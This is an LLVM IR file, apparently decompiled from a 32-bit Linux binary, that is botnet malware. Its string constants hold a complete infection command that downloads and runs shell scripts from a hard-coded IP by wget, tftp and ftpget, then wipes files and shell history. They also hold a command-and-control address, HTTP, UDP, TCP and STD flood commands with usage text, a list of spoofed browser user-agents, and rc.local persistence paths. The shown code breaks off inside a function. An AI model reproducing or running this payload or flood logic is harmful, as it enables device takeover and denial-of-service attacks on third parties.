source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@cf = internal unnamed_addr global i1 false
@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_80590f4.2 = global i32 0
@global_var_8059124.3 = local_unnamed_addr global i32* @global_var_80590f4.2
@global_var_80580e4.4 = constant i32 0
@global_var_80590f8.6 = local_unnamed_addr global i32 0
@global_var_805a180.7 = global i32 0
@global_var_805a184.8 = local_unnamed_addr global i32 0
@global_var_805a188.9 = local_unnamed_addr global i32 0
@global_var_8059eb0.10 = local_unnamed_addr global i32 4095
@global_var_8059eac.11 = local_unnamed_addr global i32 362436
@global_var_8055d3d.12 = constant [7 x i8] c"(null)\00"
@global_var_8055d44.14 = constant [3 x i8] c"-c\00"
@global_var_8055d47.15 = constant [3 x i8] c"sh\00"
@global_var_8055d4a.16 = constant [8 x i8] c"/bin/sh\00"
@global_var_8055d60.17 = constant i32 -1
@global_var_805a160.18 = local_unnamed_addr global i32 0
@global_var_8056160.19 = constant [5 x i8] c"PING\00"
@global_var_8055d31.20 = constant [8 x i8] c"busybox\00"
@global_var_8055d39.21 = constant i32 2293796
@global_var_8055d3b.22 = constant i32 1848115235
@global_var_8059e60.23 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8055d31.20, i32 0, i32 0), i8* bitcast (i32* @global_var_8055d39.21 to i8*), i8* bitcast (i32* @global_var_8055d3b.22 to i8*)]
@global_var_8055d05.24 = constant [7 x i8] c"nvalid\00"
@global_var_8055d0c.25 = constant [6 x i8] c"ailed\00"
@global_var_8055d12.26 = constant [9 x i8] c"ncorrect\00"
@global_var_8055d1b.27 = constant [6 x i8] c"enied\00"
@global_var_8055d21.28 = constant [5 x i8] c"rror\00"
@global_var_8055d26.29 = constant [7 x i8] c"oodbye\00"
@global_var_8055d2d.30 = constant [4 x i8] c"bad\00"
@global_var_8059e40.31 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8055d05.24, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055d0c.25, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8055d12.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055d1b.27, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8055d21.28, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8055d26.29, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8055d2d.30, i32 0, i32 0)]
@global_var_805a168.32 = local_unnamed_addr global i32 0
@global_var_805a16c.33 = local_unnamed_addr global i32 0
@global_var_80603f4.34 = local_unnamed_addr global i32 0
@global_var_8056165.35 = constant [6 x i8] c":>%$#\00"
@global_var_805616c.40 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_80603e8.41 = local_unnamed_addr global i32 0
@global_var_8055ca0.42 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_8055caf.43 = constant [6 x i8] c"/tmp/\00"
@global_var_8055cb5.44 = constant [6 x i8] c"/var/\00"
@global_var_8055cbb.45 = constant [6 x i8] c"/dev/\00"
@global_var_8055cc1.46 = constant [10 x i8] c"/var/run/\00"
@global_var_8055ccb.47 = constant [10 x i8] c"/dev/shm/\00"
@global_var_8055cd5.48 = constant [6 x i8] c"/mnt/\00"
@global_var_8055cdb.49 = constant [7 x i8] c"/boot/\00"
@global_var_8055ce2.50 = constant [6 x i8] c"/usr/\00"
@global_var_8055ce8.51 = constant [6 x i8] c"/opt/\00"
@global_var_8059e00.52 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_8055ca0.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055caf.43, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055cb5.44, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055cbb.45, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8055cc1.46, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8055ccb.47, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055cd5.48, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8055cdb.49, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055ce2.50, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055ce8.51, i32 0, i32 0)]
@global_var_8059e2c = external global i32
@global_var_8056178.57 = constant [3 x i8] c"\0D\0A\00"
@global_var_8059e80.58 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8055d05.24, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055d0c.25, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8055d12.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055d1b.27, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8055d21.28, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8055d26.29, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8055d2d.30, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8055d31.20, i32 0, i32 0), i8* bitcast (i32* @global_var_8055d39.21 to i8*), i8* bitcast (i32* @global_var_8055d3b.22 to i8*)]
@global_var_805617c.59 = constant i32 993090331
@global_var_80561d9.60 = constant [5 x i8] c"sh\0D\0A\00"
@global_var_80561de.61 = constant [8 x i8] c"shell\0D\0A\00"
@global_var_8055150.62 = constant [443 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.166.150.230/bassboots.sh; chmod 777 bassboots.sh; sh bassboots.sh; tftp 188.166.150.230 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; tftp -r ktftp2.sh -g 188.166.150.230; chmod 777 ktftp2.sh; sh ktftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 188.166.150.230 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bassboots.sh ktftp1.sh ktftp2.sh ftp1.sh; rm -rf *;history -c\0D\0A\00"
@global_var_80591d4.63 = local_unnamed_addr global [443 x i8]* @global_var_8055150.62
@global_var_8056208.64 = constant [6 x i8] c"arfgG\00"
@global_var_805620e.65 = constant [9 x i8] c"HBiug655\00"
@global_var_8056217.66 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_8056224.67 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_8056238.68 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_8056249.69 = constant [12 x i8] c"GJjyur67458\00"
@global_var_8056255.70 = constant [12 x i8] c"RYSDk747586\00"
@global_var_8056261.71 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_805626d.72 = constant [10 x i8] c"KHGK7985i\00"
@global_var_8056277.73 = constant [11 x i8] c"yuituiILYF\00"
@global_var_8056282.74 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_8056290.75 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_805629c.76 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_80562a9.77 = constant [9 x i8] c"ewqdcftr\00"
@global_var_80562b2.78 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_80562c2.79 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_80562cd.80 = constant [12 x i8] c"twehgbferhb\00"
@global_var_80562d9.81 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_80562e5.82 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_80562f3.83 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_8056301.84 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_805630f.85 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_8056319.86 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_8056327.87 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_8056335.88 = constant [12 x i8] c"yteytietyue\00"
@global_var_8056341.89 = constant [9 x i8] c"qsortEQS\00"
@global_var_805634a.90 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_805635a.91 = constant [4 x i8] c"std\00"
@global_var_805635e.92 = constant [4 x i8] c"dts\00"
@global_var_8056362.93 = constant [4 x i8] c"lsk\00"
@global_var_8056366.94 = constant [4 x i8] c"kek\00"
@global_var_805636a.95 = constant [6 x i8] c"smack\00"
@global_var_8056370.96 = constant [4 x i8] c"ily\00"
@global_var_8056374.97 = constant [4 x i8] c"tyf\00"
@global_var_8056378.98 = constant [4 x i8] c"pos\00"
@global_var_805637c.99 = constant [6 x i8] c"cunts\00"
@global_var_80563a0.100 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056208.64, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805620e.65, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8056217.66, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_8056224.67, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_8056238.68, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8056249.69, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8056255.70, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8056261.71, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805626d.72, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8056277.73, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8056282.74, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8056290.75, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805629c.76, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80562a9.77, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_80562b2.78, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_80562c2.79, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_80562cd.80, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_80562d9.81, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80562e5.82, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80562f3.83, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8056301.84, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805630f.85, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8056319.86, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8056327.87, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8056335.88, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8056341.89, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805634a.90, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805635a.91, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805635e.92, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056362.93, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056366.94, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805636a.95, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056370.96, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056374.97, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056378.98, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805637c.99, i32 0, i32 0)]
@global_var_8054460.101 = constant [64 x i8] c"Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)\00"
@global_var_80544a0.102 = constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00"
@global_var_80544e4.103 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00"
@global_var_8054528.104 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00"
@global_var_805456c.105 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00"
@global_var_80545b0.106 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01\00"
@global_var_80545f4.107 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00"
@global_var_8054638.108 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_80546a8.109 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36\00"
@global_var_805471c.110 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0\00"
@global_var_8054768.111 = constant [135 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4\00"
@global_var_80547f0.112 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0\00"
@global_var_805483c.113 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\00"
@global_var_80548ac.114 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36\00"
@global_var_805491c.115 = constant [115 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56\00"
@global_var_8054990.116 = constant [117 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7\00"
@global_var_8054a08.117 = constant [69 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\00"
@global_var_8054a50.118 = constant [47 x i8] c"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)\00"
@global_var_8054a80.119 = constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00"
@global_var_8054ac0.120 = constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00"
@global_var_8054b0c.121 = constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A\00"
@global_var_8054b84.122 = constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_8054bf4.123 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36\00"
@global_var_8054c64.124 = constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00"
@global_var_8054cd8.125 = constant [147 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00"
@global_var_8054d6c.126 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00\00"
@global_var_8054db4.127 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)\00"
@global_var_8054dfc.128 = constant [64 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)\00"
@global_var_8054e3c.129 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)\00"
@global_var_8054eb8.130 = constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00"
@global_var_8054f20.131 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)\00"
@global_var_8054f9c.132 = constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00"
@global_var_8054fec.133 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00"
@global_var_8055040.134 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0\00"
@global_var_8055094.135 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0\00"
@global_var_80550e8.136 = constant [83 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0\00"
@global_var_805513b.137 = constant [20 x i8] c"188.166.150.230:123\00"
@global_var_8056430.139 = constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00"
@global_var_8056470.140 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_805648c.141 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_80564ad.142 = constant [4 x i8] c"all\00"
@global_var_80564b1.143 = constant i32 2037579820
@global_var_80564b3.144 = constant [4 x i8] c"syn\00"
@global_var_80564b7.145 = constant [4 x i8] c"rst\00"
@global_var_80564bb.146 = constant [4 x i8] c"fin\00"
@global_var_80564bf.147 = constant [4 x i8] c"ack\00"
@global_var_80564c3.148 = constant [4 x i8] c"psh\00"
@global_var_80564c7.149 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_80564d9.150 = constant [6 x i8] c"PONG!\00"
@global_var_80564df.151 = constant [6 x i8] c"PUSSY\00"
@global_var_80564e5.152 = constant [4 x i8] c"OFF\00"
@global_var_80603f0.153 = local_unnamed_addr global i32 0
@global_var_80564e9.154 = constant [14 x i8] c"REP STOPPING!\00"
@global_var_80564f7.155 = constant [3 x i8] c"ON\00"
@global_var_80564fa.156 = constant [5 x i8] c"HTTP\00"
@global_var_8056500.157 = constant [38 x i8] c"HTTP %s Flooding %s:%d for %d seconds\00"
@global_var_8056526.158 = constant [4 x i8] c"UDP\00"
@global_var_805652c.159 = constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00"
@global_var_805659d.160 = constant [4 x i8] c"TCP\00"
@global_var_80565a4.161 = constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00"
@global_var_805665e.162 = constant [4 x i8] c"STD\00"
@global_var_8056662.163 = constant [27 x i8] c"STD <target> <port> <time>\00"
@global_var_805667d.164 = constant [5 x i8] c"STOP\00"
@global_var_8059df8.165 = local_unnamed_addr global i32 -1
@global_var_80591d0.166 = global [20 x i8]* @global_var_805513b.137
@global_var_8056682.167 = constant [8 x i8] c"8.8.8.8\00"
@global_var_805668a.168 = constant [16 x i8] c"/proc/net/route\00"
@global_var_805669a.169 = constant [11 x i8] c"\0900000000\09\00"
@global_var_80566a5.171 = constant [7 x i8] c"x86_32\00"
@global_var_80566ac.172 = constant i32 1952788224
@global_var_80566ad.173 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@global_var_80566c0.174 = constant i32 1697579122
@global_var_80566c2.175 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_80566d1.177 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_80566d9.178 = constant i32 1868955745
@global_var_80566db.179 = constant [13 x i8] c"fork failed\0A\00"
@global_var_80566e8.180 = constant i32 993090331
@global_var_805674f.181 = constant [5 x i8] c"PONG\00"
@global_var_8056754.182 = constant [9 x i8] c"LELIMDUP\00"
@global_var_805675d.183 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_8056771.184 = constant [11 x i8] c"STOLENBOTS\00"
@global_var_805677c.185 = constant [8 x i8] c"%s 2>&1\00"
@global_var_8056784.186 = constant [3 x i8] c"%s\00"
@global_var_8056787.187 = constant i32 32
@global_var_80603b0.188 = local_unnamed_addr global i32 0
@global_var_8059eb8 = external local_unnamed_addr global i32
@global_var_8059f20.191 = global i32 288
@global_var_8059f70.192 = local_unnamed_addr global i32 272
@global_var_80603c0.194 = global i32 0
@global_var_8059ef4.195 = global i32 0
@global_var_805e184.196 = local_unnamed_addr global i32 0
@global_var_805e188.197 = local_unnamed_addr global i32 0
@global_var_8059f0c.198 = local_unnamed_addr global i32 2
@global_var_8059edc.199 = global i32 0
@global_var_8059ed8.200 = global i32* @global_var_8059f20.191
@global_var_8056da0.201 = constant i32 0
@global_var_8056db8.202 = constant [6 x i8] c"(nil)\00"
@global_var_8056dbe.203 = constant [7 x i8] c"(null)\00"
@global_var_8056dc5.204 = constant i32 2949163
@global_var_8056e32.206 = constant i32 327688
@global_var_8056e2a.207 = constant [8 x i8] c" +0-#'I\00"
@global_var_8056dd8.208 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_8056e15.209 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_8056e0b.210 = constant i32 117506048
@global_var_8056dfc.211 = constant i32 331776
@global_var_8056e80.212 = constant [8 x i8] c"Success\00"
@global_var_8056e56.213 = constant [15 x i8] c"Unknown error \00"
@global_var_8057d80.214 = constant i32 65536
@global_var_805a120.215 = local_unnamed_addr global i32* @global_var_8057d80.214
@global_var_80601a0.216 = global i32 0
@global_var_80601a4.217 = global i32 0
@global_var_80601c0.218 = global i32 0
@global_var_806038c.219 = global i32 0
@global_var_805a128.220 = global i32 0
@global_var_8060814.221 = local_unnamed_addr global i32 0
@global_var_8060808.222 = global i32 0
@global_var_8060400.223 = global i32 0
@global_var_805a010.224 = global i32 0
@global_var_80604ac.226 = global i32 0
@global_var_80604b0.227 = local_unnamed_addr global i32 0
@global_var_80604b4.228 = global i32 0
@global_var_80604c0.229 = local_unnamed_addr global i32 0
@global_var_80607b4.230 = global i32 0
@global_var_80607dc.231 = local_unnamed_addr global i32 0
@global_var_80607cc.232 = local_unnamed_addr global i32 0
@global_var_80607d0.233 = local_unnamed_addr global i32 0
@global_var_80607d4.234 = local_unnamed_addr global i32 0
@global_var_80607d8.235 = local_unnamed_addr global i32 0
@global_var_80607e4.236 = local_unnamed_addr global i32 0
@global_var_80607f0.237 = local_unnamed_addr global i32 0
@global_var_80607e8.238 = local_unnamed_addr global i32 0
@global_var_80607f4.239 = local_unnamed_addr global i32 0
@global_var_80607c8.240 = local_unnamed_addr global i32 0
@global_var_80607c4.242 = local_unnamed_addr global i32 0
@global_var_80607ec.243 = local_unnamed_addr global i32 0
@global_var_80604bc.244 = local_unnamed_addr global i32 0
@global_var_805a028.245 = global i32 0
@global_var_805a040.247 = global i32 0
@global_var_805a058 = external global i32
@global_var_805a084.249 = global i32 -1726662223
@global_var_805a060.250 = local_unnamed_addr global i32* @global_var_805a084.249
@global_var_805a05c.251 = global i32* @global_var_805a084.249
@global_var_80579f4.252 = constant i32 0
@global_var_80579e0.253 = constant i32 0
@global_var_805a100.254 = global i32 0
@global_var_80603a4.255 = local_unnamed_addr global i32 0
@global_var_80603ac.256 = local_unnamed_addr global i32 0
@global_var_80590e8.258 = global i32 -1
@global_var_805155b.259 = constant i32 -294069
@global_var_80603b4.260 = local_unnamed_addr global i32 0
@global_var_80603b8.261 = local_unnamed_addr global i32 0
@global_var_8057c60.262 = constant [10 x i8] c"/dev/null\00"
@global_var_80603a8.264 = local_unnamed_addr global i32 0
@global_var_8051741.266 = constant i32 1928542531
@global_var_8051765.267 = constant i32 1928542531
@global_var_80603e4.268 = local_unnamed_addr global i32 0
@global_var_80603c4.269 = global i32 0
@global_var_8057f90.271 = constant [4 x i8] c"inf\00"
@global_var_8057f93.276 = constant i32 1179535616
@global_var_8057fa0.277 = constant i32 2883630
@global_var_8060818.281 = local_unnamed_addr global i32 0
@global_var_805805c.282 = constant i32 1697579054
@global_var_8058090.283 = constant i32 1868824690
@global_var_805805e.284 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_805806f.285 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_8058087.286 = constant [11 x i8] c"nameserver\00"
@global_var_8058092.287 = constant [7 x i8] c"domain\00"
@global_var_8058099.288 = constant [7 x i8] c"search\00"
@global_var_80607f8.289 = global i32 0
@global_var_806081c.290 = local_unnamed_addr global i32 0
@global_var_8060820.291 = local_unnamed_addr global i32 0
@global_var_80580b4.292 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_80580b1.294 = constant [3 x i8] c"%x\00"
@global_var_80580c5.295 = constant [11 x i8] c"/etc/hosts\00"
@global_var_80580d0.296 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_805a140.1 = local_unnamed_addr global i8 0
@global_var_805e180.13 = external local_unnamed_addr global i8*
@global_var_805a17b.36 = local_unnamed_addr global i8 0
@global_var_805a17c.37 = local_unnamed_addr global i8 0
@global_var_805a17d.38 = local_unnamed_addr global i8 0
@global_var_805a17e.39 = local_unnamed_addr global i8 0
@global_var_805a170.170 = external global i8*
@1 = internal constant [2 x i8] c"/\00"
@global_var_80566cf.176 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_8056e4a.205 = external constant i8*
@global_var_8060480.225 = global i8 0
@global_var_80607e0.241 = local_unnamed_addr global i8 0
@global_var_80603a0.246 = local_unnamed_addr global i8 0
@global_var_80603bc.263 = local_unnamed_addr global i8 0
@global_var_80603c8.278 = external global i8*
@global_var_80603e0.279 = local_unnamed_addr global i64 0
@global_var_805a124.280 = local_unnamed_addr global i16 1

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @__get_pc_thunk_bx(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 69727
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @frame_dummy()
  %v0_80480a8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480a8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480c6 = load i8, i8* @global_var_805a140.1, align 64
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %entry.dec_label_pc_8048106_crit_edge

entry.dec_label_pc_8048106_crit_edge:             ; preds = %entry
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %entry
